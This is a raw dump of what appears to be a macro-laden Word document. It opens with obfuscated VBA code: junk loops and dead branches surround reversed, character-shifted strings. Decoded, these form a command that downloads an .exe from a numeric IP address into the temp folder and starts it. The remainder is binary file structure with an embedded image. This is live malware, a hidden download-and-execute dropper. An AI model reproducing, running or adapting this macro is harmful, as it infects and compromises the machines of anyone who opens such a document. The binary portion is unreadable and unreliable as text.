        Horc = Replace("JSOcUpbnHtVfbDylYZ", "JSO", "JTlnbj")
        Horc = StrReverse("nfhISYlKmSxI")
        Horc = Replace("kBsBpJEbzLlJpUr", "kBsB", "pRBurG")
                If 2261313 = 66 - 524 Then
            QQHMD = Replace("qJmZVIGBspqllvb", "qJmZ", "pwwpCp")
            QQHMD = StrReverse("qJmZVIGBspqllvb")
            End If
        Horc = Replace("GVRMUvuCipOEq", "GVRM", "Updg")
                If 106364 = 254 - 5647 Then
            okkrM = Replace("EgUMpmChVtoqPTHwx", "EgUM", "FJCybw")
            okkrM = StrReverse("EgUMpmChVtoqPTHwx")
            End If
                If 416707 = 123 - 6789 Then
            dvSrp = Replace("jBhHRgLSwEV", "jBh", "sYojaWE")
            dvSrp = StrReverse("jBhHRgLSwEV")
            End If
        Horc = Replace("zoencznjGLOsQmg", "zoen", "zcLCr")
        Horc = Replace("UEOkLkmmyOQv", "UEO", "TxkJ")
        Horc = StrReverse("TEMBSbkIHQpZE")
        Horc = Replace("XHnUnqVHeuKjwmcjodt", "XHnU", "SooTqzs")
                If 2336089 = 211 - 8124 Then
            UZZSi = Replace("AVQyjEVsrImzI", "AVQ", "JZJpfez")
            UZZSi = StrReverse("AVQyjEVsrImzI")
            End If
        Horc = Replace("YYRahSAYme", "YYR", "okKb")
        Horc = StrReverse("JuaXqhnYtzcYeGMhOC")
        Horc = StrReverse("yCdJOrEKXbBMS")
    Next eGqnE
    Yqd = Yqd & StrReverse(StrReverse("vBgpmhYdvBHnu[r}<*(fyf/cVKI](,*)iubQqnfUufH;;^iubQ/PJ/nfutzT\)!iubqfmjG.!ttfdpsQ"))
CpWHC = StrReverse("CpysciZJeUVwlvil")
    For ZBauV = 0 To 245
        sVdC = StrReverse("laszqtvTPppgCsaJI")
        sVdC = StrReverse("XQnvXnbhufzaJnqF")
                If 3734631 = 206 - 6973 Then
            uDSwE = Replace("tzUdjHTvtjh", "tzU", "vRErd")
            uDSwE = StrReverse("tzUdjHTvtjh")
            End If
        sVdC = StrReverse("ibsEkGGsxYFZwtBt")
        sVdC = StrReverse("okTQjhOdMRK")
        sVdC = StrReverse("SsPiLgLpfuxDMEpp")
        sVdC = Replace("VAyXdEAYVzCwAcgRz", "VAy", "DEqiOfd")
        sVdC = Replace("bIERVPdbgaEKHGZ", "bIER", "JRJxb")
        sVdC = Replace("VJsmkcFmyCcFzY", "VJsm", "DUfSdi")
        sVdC = Replace("lPEygiLYyYsCOxmU", "lPE", "qHscHe")
        sVdC = StrReverse("loYmTteJsGuwIxMP")
        sVdC = StrReverse("nTnwKFjCgw")
        sVdC = StrReverse("DPqttoUUlSqbXZ")
        sVdC = Replace("hwVQAgURQYFRMv", "hwV", "EXou")
        sVdC = StrReverse("PXGXyWSJGFIwsVr")
        sVdC = Replace("CYvdmldCpoLOp", "CYv", "piHsfF")
                If 1923178 = 185 - 4594 Then
            ZaXMK = Replace("IlslwhzLWYpeuYizj", "Ilsl", "MEMhJq")
            ZaXMK = StrReverse("IlslwhzLWYpeuYizj")
            anHFi = Replace("PIHtWUSFLQAm", "PIH", "LCnZynP")
            anHFi = StrReverse("PIHtWUSFLQAm")
            End If
        sVdC = StrReverse("eQHVKxJLDZxGyBzRH")
                If 2450153 = 154 - 3618 Then
            HAbRF = Replace("GjXUjkSjpV", "GjX", "OaAHV")
            HAbRF = StrReverse("GjXUjkSjpV")
            HDzUx = Replace("veWaOoLZkVjJHFVwJtz", "veW", "GRwntl")
            HDzUx = StrReverse("veWaOoLZkVjJHFVwJtz")
            End If
        sVdC = Replace("iwQUsdqPWWs", "iwQ", "Mkhuc")
        sVdC = Replace("yUiOQRMnZTxePlievqg", "yUi", "GVeju")
        sVdC = StrReverse("IvYtWJzxjSzCVsmoflO")
        sVdC = StrReverse("IQzhkMasxWgA")
        sVdC = StrReverse("dZusZmbJrDqn")
                If 1817845 = 233 - 7812 Then
            XgFrI = Replace("lbotvJHweAcjSrZscs", "lbo", "EwhXX")
            XgFrI = StrReverse("lbotvJHweAcjSrZscs")
            ktDyQ = Replace("DbyJKjCFhHgSG", "DbyJ", "aFnu")
            ktDyQ = StrReverse("DbyJKjCFhHgSG")
            End If
    Next ZBauV
    Yqd = Yqd & StrReverse(StrReverse(".usbuT!2!x.!fyf/mmfitsfxpq<**(fyf/cVKI](,*)iubQqnfUufH;;^iubQ/PJ/nfutzT\)-("))
CpWHC = Replace("UqOaZHBHfqsPi", "UqOa", "zxLqQ")
    For KsjHa = 0 To 44
                If 2340766 = 159 - 3451 Then
            naSjH = Replace("iEOhCoYpddarP", "iEOh", "ZWjmqxW")
            naSjH = StrReverse("iEOhCoYpddarP")
            End If
        wuxn = Replace("XLtbkhPcvC", "XLtb", "oqtLW")
        wuxn = StrReverse("xPhKHJogvzEbWbMFoIh")
        wuxn = Replace("doeynDlReCOQWXQkr", "doey", "nXBa")
        wuxn = StrReverse("nsdZBDsCXJQUnSK")
        wuxn = Replace("DaScBKucrOX", "DaS", "VfRCFkM")
        wuxn = Replace("VxodFiOIspUA", "Vxo", "FkHmeH")
        wuxn = Replace("SLYDGsajow", "SLY", "qufGFm")
        wuxn = StrReverse("JVPRjYkayshDpKEXUts")
        wuxn = StrReverse("HrsnXISHWvhHtMzdsUg")
                If 1641766 = 74 - 4892 Then
            KGezn = Replace("yjJHXnbAXF", "yjJH", "VnTROC")
            KGezn = StrReverse("yjJHXnbAXF")
            End If
        wuxn = Replace("qCpAunBPRFXIthMpusB", "qCpA", "tAtwMk")
        wuxn = Replace("fQzmKjWyhDZIOErLKI", "fQz", "aRFPBXF")
                If 3811413 = 229 - 3734 Then
            Xjztl = Replace("QIwbaiPjWaQb", "QIw", "Lauyy")
            Xjztl = StrReverse("QIwbaiPjWaQb")
            End If
        wuxn = Replace("kEKLbMpRWAgdvMOYDy", "kEK", "ybdU")
        wuxn = StrReverse("KHkOFhczRlIDITUa")
        wuxn = Replace("yOBlCiOvOZPdXcL", "yOB", "qQacy")
        wuxn = StrReverse("ACjYAbEYLtZCPBWJOez")
        wuxn = StrReverse("zeYcIyePQKB")
        wuxn = StrReverse("vfoVSXuTtSoaZqZM")
        wuxn = Replace("fZoQiycwVeMsVsI", "fZo", "DUctvXb")
                If 3351316 = 73 - 4289 Then
            aqFEo = Replace("mdSpAbiYqL", "mdS", "vdFzBQA")
            aqFEo = StrReverse("mdSpAbiYqL")
            End If
                If 2731482 = 70 - 2754 Then
            AuDZK = Replace("ThEEGMnsCxJKEeau", "ThEE", "imlPIIR")
            AuDZK = StrReverse("ThEEGMnsCxJKEeau")
            jUOLX = Replace("yJgyAwOksQIGbpPUVJ", "yJg", "XTVyfk")
            jUOLX = StrReverse("yJgyAwOksQIGbpPUVJ")
            End If
        wuxn = StrReverse("vnqGxXvnyiJgmmIP")
        wuxn = Replace("tRfnvgckuQVyDr", "tRf", "jZIp")
    Next KsjHa
    Yqd = Yqd & StrReverse(StrReverse("fyf/be0333/96/:92/69200;quui()fmjGebpmoxpE/*uofjmDcfX/ufO/nfutzT!udfkcP.xfO)!2!x.!fyf/mmfitsf"))
CpWHC = Replace("QbniSQQDuVEa", "Qbni", "WlGK")
    For VMIvi = 0 To 228
        WtUc = Replace("qWAtexEAoxTxQ", "qWA", "szwWw")
                If 1054188 = 90 - 6773 Then
            OLJqu = Replace("DkzllXBUZayL", "Dkz", "dpmfhc")
            OLJqu = StrReverse("DkzllXBUZayL")
            End If
        WtUc = Replace("UmTSTGKOFd", "UmTS", "UuKvZ")
        WtUc = Replace("gxYlpblMLWgVUXtymu", "gxYl", "lrWViKX")
        WtUc = Replace("sIxjCmkzmXnBMZT", "sIxj", "CRGR")
        WtUc = StrReverse("RyYABojkjYAtczSseeZ")
        WtUc = StrReverse("ICFvauttSTgYsOmFK")
        WtUc = Replace("vlJgirqWDs", "vlJg", "Gsuyjg")
        WtUc = Replace("ESJsXiWrJX", "ESJs", "eSii")
        WtUc = Replace("wMYLlDohbs", "wMY", "HZJjM")
                If 3150802 = 260 - 3438 Then
            ZnCMc = Replace("OmUskOIvYoObzWLUE", "OmU", "PZFGuyk")
            ZnCMc = StrReverse("OmUskOIvYoObzWLUE")
            WXDVa = Replace("PEimvbJOzZJ", "PEim", "bizclb")
            WXDVa = StrReverse("PEimvbJOzZJ")
            End If
        WtUc = Replace("ehIxepOCBesVl", "ehI", "IuIn")
        WtUc = StrReverse("DUCvGddEJOjZqlpX")
        WtUc = Replace("ceQCwuoBjkAkgpya", "ceQC", "iafqDm")
        WtUc = Replace("yhdvwonludPBLXRo", "yhd", "xoLQ")
                If 2866535 = 186 - 657 Then
            iGWWF = Replace("frmRrtAKGalgeosvP", "frmR", "GpKO")
            iGWWF = StrReverse("frmRrtAKGalgeosvP")
            pFXCx = Replace("aERxibplOnlblfYdSC", "aER", "ZIjKB")
            pFXCx = StrReverse("aERxibplOnlblfYdSC")
            End If
                If 2483608 = 46 - 3014 Then
            YVEEF = Replace("MDytZgsOlwXztif", "MDyt", "aMJpbZ")
            YVEEF = StrReverse("MDytZgsOlwXztif")
            End If
        WtUc = Replace("mRmMBYdqckLEPA", "mRmM", "mjjFTF")
        WtUc = Replace("TQsOKlLlwXnskyIa", "TQs", "MSTKz")
        WtUc = Replace("epQbyYVXiyGpBizd", "epQ", "PAFtAiO")
        WtUc = Replace("ZVpxwcAGoWDRkM", "ZVp", "iYwQt")
                If 3857683 = 62 - 358 Then
            dAMwC = Replace("jGoGgkrxISxuBlAB", "jGoG", "EWztcwo")
            dAMwC = StrReverse("jGoGgkrxISxuBlAB")
            vLuzs = Replace("TCBwaAfvOT", "TCB", "BWLpv")
            vLuzs = StrReverse("TCBwaAfvOT")
            End If
        WtUc = Replace("cykDccVRjjiiJWGnHuS", "cyk", "WwjqP")
                If 144964 = 174 - 5661 Then
            VYwoJ = Replace("nUlMXMjSGqKyMRp", "nUl", "EQAYA")
            VYwoJ = StrReverse("nUlMXMjSGqKyMRp")
            egQoP = Replace("ZIPTQjxohTL", "ZIP", "nSnem")
            egQoP = StrReverse("ZIPTQjxohTL")
            End If
                If 946673 = 132 - 3649 Then
            lRFZG = Replace("UZJUhTUTymYiGU", "UZJU", "TOQF")
            lRFZG = StrReverse("UZJUhTUTymYiGU")
            End If
    Next VMIvi
    Yqd = Yqd & StrReverse(StrReverse("xpq}[BoTe}VTHX"))
CpWHC = StrReverse("dpzRlmLcGnOLM")
    Dim Ride() As Byte
JetTb = StrReverse("hztGBQIMBKu")
    Ride = StrConv(Yqd, vbFromUnicode)
    While kLLd <= UBound(Ride)
        CpWHC = Replace("gyreyVnwur", "gyr", "edsOu")
        CpWHC = Replace("RzoUxernev", "Rzo", "tQVez")
        Ride(kLLd) = Ride(kLLd) - BpAGI
    kLLd = kLLd + 1
        CpWHC = Replace("awsyfOfgfY", "aws", "ffPpV")
        CpWHC = Replace("QPnWrMOqxk", "QPn", "pLOiF")
    Wend
    utfkIyOxwR = StrConv(Ride, vbUnicode)
ÐÏà¡±á                >  þÿ	               Ð          Ó      þÿÿÿ    Î   Ï   Ö   }  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿì¥Á _À	  ø¿                bjbj,E,E                  	 .  N/  N/                                 ÿÿ         ÿÿ         ÿÿ                 ·     ’      ’  ì      ì      ì      ì      ì             ÿÿÿÿ                                           È  0                                ó      ó      ó      G     I      I      I      I      I      I  $   ø  ²  ª  N   m                     ì      ó                      ó      ó      ó      ó      m              ì      ì                      Û   ‚                       ó     ì            ì            G                                                                    ó      G                                                                                                                      ÿÿÿÿ     X´!ÓÓ        ÿÿÿÿ                       3     ˜  0   È            ø            ø                                                                                    ø              ì            ó      ó            ó      ó                                      ó      ó      ó      m      m                                                                            ó      ó      ó      È      ó      ó      ó      ó              ÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ            ÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ    ÿÿÿÿ    ø      ó      ó      ó      ó      ó      ó                                                              ó      ó      ó      ’     ²  :     	                                                                                                                                                                                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ïë                                                                                                                                                                                                                                                                                                                                                                                                                                                                        hˆ5e   j    hÑRƒ h”UŸ UmH nH u     ý                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     , 1h°Ð/ °à=!° "° # $ %°  °Ð°ÐÐ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  2P D d                    J@)îî                                 ðj   ²
ð      
  c ð8   A   ?   ¿   ÿ   €Ã   ¿   P i c t u r e   1    "ñ   ª     ð      €R  ðtO %ßÐna;&·¥
ÞOJêwÿ PO    D     à  FðHO %ßÐna;&·¥
ÞOJêwÿÿØÿà JFIF  H H  ÿáÐExif  MM *                             h       p(              x      P       H      H   ÿØÿÛ C     		

 $.' ",#(7),01444'9=82<.342ÿÛ C			

2!!22222222222222222222222222222222222222222222222222ÿÀ  Y  ! ÿÄ            	
ÿÄ µ   } !1AQa "q2‘¡#B±ÁRÑð$3br‚	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ         	
ÿÄ µ   w !1AQ aq"2B‘¡±Á	#3RðbrÑ
$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ   ? ÷ú( ¢€
( ¢€
( ¢€
( ¢€
( ¢€
( ¢€
( ¢€
CÒ€Š ( Š ( Š ( Š ( Š )J Z( ¢€
( ¢€
(ÆÍmákÉ­å’)Wf×Š‘ó¯qXº†“¨iÖ–—ÖºÆ­pÆh÷Æò—P§“‘éõâ¸«ÆR›³jÉmêÏOR¥(§ÌÚm­´_æ]¶ñeüº¼6×ÖÖsÜ½´wO8É`Œ¦22ÿ ×Qø¿Æÿ ðŠC¨Ht¹¯>Ëk
Âùe€mò20fÚU1´“–ÉÀàšô«STÚå•ÏYTMÊ6-]xÓO´³[Ù-î¾ÈÐÍ*Ë„ê·M¥ƒ 	*FG;±µö¹|V²jÐÙG¥Ý¼r^½—ÚVXŠŽçîÈHFÈ Óâ²6:*( ¤=(j»_[¢†y6¡vMÌ¤( àäôð3×µ 2mRÂÝí–[¸Ü±HrÜ9‡üóÔŠS©X†‘Mä£ûàÈ9Çó8úñ@ûu¦è—íPî›ýXÞ2ÿ OZSu¹û1ß`¸=ìè
ùPQ³VUûLE™Â*«KqìAö =)©©Z½ÛÚ‰Muda´dŒ’F;~#ž”hÀrB)h†µoÖuÔ^l>YvMÅs·æp+°ÑÒÎÀ\´ÇïB³¸É
ÇRy—Zó±7öÉ¤´Z¶ßèwáëÎœÑ½¬·ùúgIm#²Ömm¬'·±ÔdI
ÜÊJ˜'Êù¹ÈúqŠéo"msÅ·ZMÍÍä6VVV÷*–—2[´²Jó),ñ°bD0 –$ƒ…ÛéÊ¬êk#ÇÃ®[¤»?Óô9­RãY“P³ÐmXÝÛZë¦Ì4Ú”¶ÒKØ>Ð©$‘«3 ]¾cÉòÐ6âÌôÝ^}*;­O\‚àÍÖo Ôå™|»{•M‚7Ú„üåWž7²t¡âsLšÎÊ}Áµ³#¢C+ÄÆs³7gs¢…
s»95¿¢ê2jºL7’ÚKi+G†@~VV*HÈ©+•$TƒœPúJ +"E‚âe·D‡ï»–ÉˆÝ–ÃÀê¹'¾W‘¹I ‰.lnm×íK°D„mk QQ–Ü;Ò¸ tÎx·-Äªû.rYíÁ ÿ ×¦G4 ²iÅîV]–GgÝ-k– }ÀwlŸÇŒu§ÍdóLìÿ ehØ*áàÜÛ9Ü¤îç9ãŽ9àæ€+.“9–i­\»|Ì- Ü›÷l<ž0]àYêm>)-ŒrÃnÎËó°„mfÎìàçø‰8$ó@
±_mM÷0gi¶2yÁ\±Çn¹Î;Uº Šâqm,HY¡#¨ÈÅaŸÝ½¼6Òj›­â`ËÙÀéïœ×#
ëI5+t~hÞ•ef®Gÿ 6“¾M²_,ROö†nßÊ/»vvg@üªÝç†l®îà¾Y®íõ"0¥ä•£'%_93’‚I<×ZV9)Ò?„[
èúlv©ilÉök·½WiYÝçttgwbYØ«°ËÛÐR?„ôya’-™ã–+È]Ló%Ô‚I‡ <°NØ¦h5¼1lénZöý®­Oú5ÛMºhWÛ’0ÊF3¼6ìÙ ±o
ÛÛÇ
´Œ¨¸
#—cõ'’hJCÒ€¢`?;¹*@8ïúzÐ2_¤l‹ä\6çd%ac·
X“ÇN01œ’ §›ÈÖ7¤øFÚ@…‰Ï°ÆH÷P .ã/„›.»†b` ÷8àñÐóL“Q†,îK“îÛHÝì¾ãõô4 K~‘2‚àî#;!fÛNN>½E9/U¦xŒ3©WFv·É» ôÇlžã™ —ÎP3µþößºO9ÇåïÒ¤ nîRÎÎ{©†6‘‚õ œW9kãÝ*êæ8´.q¹Ñp>¸bk¯‚©^œÐÆ¥xÓ’‹êu•”2TŒ‚;ÐYGR Ö¹
Šë¨Z>£6ž³©º†4–Hûª¹p§ÓŸ-øöúTþblß½vã;³Æ=hK(êÃó :’@<Ž¢€ô ¬™¦¸–E‹QÂ†
²gwE'±à cÈæ€!šöêu˜_Û(Œ"²Ê pB’~^Œ	+ùãÚ9ìÎ¡$œÁB«"‚¡Ãsß¦qÆqÛš u÷‡EõÍÄÇVÕ óâXÊA8TB§!Ômá³ßü&°ÑÂx–úöT† óe°ä ÍÏQŽƒÒ€NÑŽœ³§ö…íÌrIæ(¸—yŒ’I
»è;~Xuž“ö9ç—í÷ÓùÎlónTëÂŒp9éì(ôQˆ¡H÷3lP»œäœw'¹§Ð~»ÿ "ö¥ÿ ^²ÿ è&¸A¢C,žW”Ò;JE$ï·QŒàdÀà€kÔÀÔp¦ÿ ¯ý¹~LãÄGškúýèvV7°iy/‰·‡K€‹Œüæ43“´˜8ëŠ±o5†¡5ëB\É[ƒ†B
Ø Žžfw/¯^+Î©ñ³ª
9=CAðëkoc!ò,¼ÍAœÎƒìòL×[ÈÜÛ)’+Æ6×Uq£é×÷’Mqy˜[–&Fêe2ÅÀ8áò}úŽ*
,\i¶·RÚK<eÞÒsqÜF×(Éž¼ü®Ã Ž}…YTœw9  R” µ™>£t–-µšÝ¸’EÂLŠƒkËÁãž â€ÚðLó.ÖhVå2¨@Á9=IÜ c°óNºÔ® ò¼»(’=ÁÍÂ*‡$ ¼òrN2ä^ &k«±4«ö"#Qû¹<ÕùÎqÈÏ˜o/„P1ÓÀg`%S:þï#¨þ÷'¿2 É/õ¸ºŒie’8ËÃ |Bçn:¯<sõ¦ý¿SýÚ‹2ÄÜ U$Ž:äàsŽÞô}$™¥*Ð•Lœ1aÐcùÿ Jš€#¸‚;«ymæ]ÑJ…sŒ‚0EdEá
þM¬‘ïR²âA¹OPpÜjÞ–&­(¸ÁèýçJw’4“Oµ[ImLBXeJ³'˜Á[%¸ãžÜUšÅ¶ÝÙiYXL
\bÂŠ )J Z­ýŸgæ´¢Ú1#Y”`¶NNHë@ai?`û öm¯Ø¿çØD<¯½»î}ß½ÏN¸=ª_ìË³›sg„ç(PrA9õäø
 š;h"ˆE1¤c¢*€?*bXYÆ KX€``g8üÉ? 
afð,
i…p3Ú000>œSÚÚ ûñ+sœ0ÈÎsüðé@DXãTA…Q€=:€
( ¢€
( ¢€
CÒ€Š ( Š ( Š ( Š ( Š )J Z( ¢€
( ¢€
( ¢€
( ¢€
( ¤=(h Š ( Š ( ÿÙÿá
€Exif  MM *                   b       j(       1       r2       Ž‡i       ¢   Â H      H     Adobe Photoshop CS5 Windows 2016:11:15 17:16:21         ¶       X                          (                    W       H      H   ÿØÿí Adobe_CM ÿî Adobe d€   ÿÛ „ 			



ÿÀ  e  " ÿÝ  
ÿÄ?           	
          	
  3 !1AQa"q2‘¡±B#$RÁb34r‚ÑC %’Sðáñcs5¢²ƒ&D“TdEÂ£t6ÒUâeò³„ÃÓuãóF'”¤…´•ÄÔäô¥µÅÕåõVfv†–¦¶ÆÖæö7GWgw‡—§·Ç×ç÷   5 !1AQaq"2‘¡±B#ÁRÑð3$bár‚’CScs4ñ%¢²ƒ &5ÂÒD“T£dEU6teâò³„ÃÓuãóF”¤…´•ÄÔäô¥µÅÕåõVfv†–¦¶ÆÖæö'7GWgw‡—§·ÇÿÚ   ? õT’I%)$’IJI$’R’I$”¤ÄÇ)Ô_ôRS$’I%)$’IJI$’R’I$”¤’I%?ÿÐõT•½‘v/GËÈ¡ÞµÖ\Çˆ$ínjÅÎg[ÃéêCªÛdúDTk®?Hæ2í¿›½E“/>“.ñÊ¸tøMœ¯º"}ÈÃŽ~Ô¸ýSôþä'ûïR’ÂgÖüg?²åœ£„2môMÀ–lõ=Mÿ ›þ\Ïë˜¸#æX^æ±Ì-
‚ÿ EÜ½¿Ì5®È»þëÿ 5êÿ 6§œ%
âmHN3¾
nè¤³O_é¡¡åï-sCÁ¼ËIØ×7k}Û·Ùüçé¢>°à¾öUClÈCêl·‡:½¼oõ[UÛ6£M\ê$’I)J/ú*J/ú))’I(j/h’@Ôr9ILÒP6Ô ´IÚ5ŸÝN,¬’"$HïÂJd’‡«Vžöê`j9á/Z™Ôlžyÿ È¹%3IA×RÖîsÚ9$€5MöŠ7ú~£w‰;dL
µ%$I0 ‰'IOÿÑôÎ£NVø÷îô¬cƒö˜tGæ’¹ü<kÆ#ìf
,eb·?)»DXÏm{šßO÷?á+ý
éìfúÜÉÀ‰ø…û#©}‘¸g&³Cb³]ñ¯õ•NfÄ¡KÑ!èö‡¯ô8ýßÑþãk—Ì#1ÇT¸ÎŸ¥Ãíþ—¦?Õr.ÇczØùxÝ;©_eŸ¯ÔöÖïRŠ±·ÔÚÞï¤÷z8_Îá~’»ž]qÏêfÎ—•gOÆÆÆ«"ëñö¬uïÈªššìšr+ªš›…sìöú¶zµ7²ÏV­ÿ Qðo~H9Ù¬ÇÌ½Ù7â2Æ
\÷8\ïg¥»é·÷Ö†oC7³2ŒË°ú…lu_l¤T^êœïSì÷Wu6ãÛUoþkô^­_é?Kw«pÎrùÖßµ¡Š‰‘=jº¼¯QÏë
ÉW½GæYOUª·äÖæaÝmãÝÔj¦ÌŒvm«#uvÓ•‘ˆÜ[nÆ¯üÚÞ‹ÖïÇ°u³öªM¹]Iï©—6Ú=sv¿Ó›q[O¥WÙ};2²jûfO¨º>¬aUè½×ä]‘Vaê6dZöºËo5¿ôÞÆÔÚYg¥UÕã×W¥W¦£wÕN™*eî¶Ê«vkVàñÔM®Ì®ÒÆ¶ÍûCýIõXÏå ÊÔê[rz]u§ƒVù–Šð™v]m¬¶eÖçelôðþÎÆþ‘•}³}¶UV7Ú·CêÔõž—OQ¥¾›mÞÒÍÍx­ïÇ´6êe7WêÔÿ Nêß²Úÿ H©;êÍÏ¾Þ­™n^#‰ÃË{q½Jƒ˜ê,¯LF×ËØïÓý¡–{êªÊý+¾-6QC*²÷ä½³ºëv ºLû½SOù•1%%QÑRQÑIL–m¤=öV_ŠðâZâAZà¯õ7ÿ -i*¿®!ìKÃˆníX7Ù»hrJiî¤WéÆ™"kAŸkŽ¾ß£¹X³÷9Îm8Æf7'M¬Üèýßj™ËéÛw;l9Û],31»Ü6þê™ê8`Ç©å£\u=¾ŠJFpÞ×n®Œ`àæívÒ ?t}&ÙôT]‰|¶Œ]­€ÒZt‘6mnßoéQQÃfÈßôd8w,ðýæ¤z† qa¸8°®äsÙ% nä’úqAÛí†“î‘¡Ñ¾ÍªOÅ½çÝN9$KœàO¸—HÉÚTÿ j`éúMLiDñ:)~ÑÄ â$ßkµn}©)ˆoRmmk
îû»U´Š°Ùî ƒÉ­ãùHé)ÿÒõ›ÙnM“éÒÇXøÔÃF÷GÜ±1þ»t‹î®–²ö›\æÝÐ÷{VŸZÿ ‘³ÿ ðµßõ\v7N¡þ‹ŒÁkëÞÓéÙ¸†3Õ±ÍœŠ7~ç¶Ïç-­^äð`ž9Ë(•ƒQ1;zxµió9sC$c†ªåÅ×^x^Ö´¼—¤xÊx¹5¶Ü{«º·è×Öàæ“ý®a?™ïTú,btzê¹îýM›m}º8 Ñh6{¬÷zOfï{Ö]Õ}Zm/›®aÙamoõ?FÊ©¬X×Süý>•>v·Ù“Ïð™U*sŒnèÕ÷ñmÄÜAÚÆÏI½›Í{†ð7Î°tÝ·ä¤¹Ì†}^ÈÊ¿!Ù¹ûÚËý6»Øwzû™O­FÛwzyN»ÔÃô²~Å~3*ÊO‡‹Ðs®eXü¦z~«Zæ5´´×èÔï`¦šýgî§}-oèÿ ÑÓëþ•©z@“ jIH8 Ì?~ªô§Ueo«¸9Ö8<Ã€c¿kÿ 5»}ÿ àÿ CüÏèÕêú}5çYœ×?Õ¹»ÒAi6öÝìÛí÷ÿ „±%6”_ôT”_ôRS%m6=­·&7\ÊÚZ ?AŽôÿ ±½h >ûÚ}´
Åº8j{µÿ ¿~çõSX¾çÜ6ÛÏP7h
 »Ôk¶;Úÿ ç}g¾¶Ëò¯¥î.ú@3÷]ýŠÏÚìãìön×Û,˜}ßO÷Ÿ±'e^	Ç–YàÓÜöíwÒIH®éùV9Å™÷TàâÖ†£ZÝ¾æ9ÌÞæoýÏÏQ=3$±¬ý¡‘-™°8þ£Gµg·ù½Û>‚;òok¡¸¶;Ü@2À ~ÓüïÌMö¬…ßd|öis&`ŸÞú?š’‘Õƒ–ÇCó­²½¢kƒƒ·nÞÖ·Ù´lØö½âÚ[ &ÉíÃhˆ O¡ôuüä†]»ƒ_cgv¢= »óç&yk‰hž5gËü"JlVÒÆ5¤î Aq€Iîã·÷”÷vº=IlD;ß»é7oöÑÒSÿÓõé¯"›(´nªÖ–=²DµÃk„·ÝôVuVzF3ýLjßU›K7z±ÂÍ™º½®þ¢ÕI>9r@ÆrŒOÍ}2þôVË$A”A#bF£ê‚¼:™M”™{mùÒFÑVßÑìÛú65¾ÄÍéØ
­•· Ê§ÓnÆÃdlvÝ?9žÅa$ÒI6WZaÁÓõz´˜ö7I-±Ý¿:ÊØÿ ë§¯«=J©®»6Š÷µ ;c~{š>ƒcè#$‚”’I$¥(¿è©(¿è¤¦J…¦Zâ÷Ôé/u„, ¹ÅÏs‹Zðß¥cÝü…}$”ÒýÓý6Õé»c ¾£øînã¿sÿ ³é&«£tÚL×Q´³W½Þ×FæûÞïÝW’IM°bCd‡ÆàKŒÁÞÞOï(žˆí¡Ísƒ4»MK÷}/¥¸ý5i$”Ö=;·ik¢Iúo ]»µßô}ö¤p1KÝak·<É!ï÷ïj²’Jc]lª¶ÖÁ
`£ ÅI$’SÿÔõT’I%)$’IJI$’R’I$”¥ý¤’JRI$’”’I$¥$’I)I$’JRI$’ŸÿÕõT—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ÿÙ ÿíìPhotoshop 3.0 8BIM%                     8BIM:     “           printOutput       ClrSenum    ClrS    RGBC    Inteenum    Inte    Img     MpBlbool   printSixteenBitbool    printerNameTEXT      8BIM;    ²           printOutputOptions       Cptnbool     Clbrbool     RgsMbool     CrnCbool     CntCbool     Lblsbool     Ngtvbool     EmlDbool     Intrbool     BckgObjc         RGBC       Rd  doub@oà         Grn doub@oà         Bl  doub@oà         BrdTUntF#Rlt            Bld UntF#Rlt            RsltUntF#Pxl@R         
vectorDatabool    PgPsenum    PgPs    PgPC    LeftUntF#Rlt            Top UntF#Rlt            Scl UntF#Prc@Y      8BIMí      H     H    8BIM&               ?€  8BIM
        x8BIM        8BIMó     	         8BIM'     
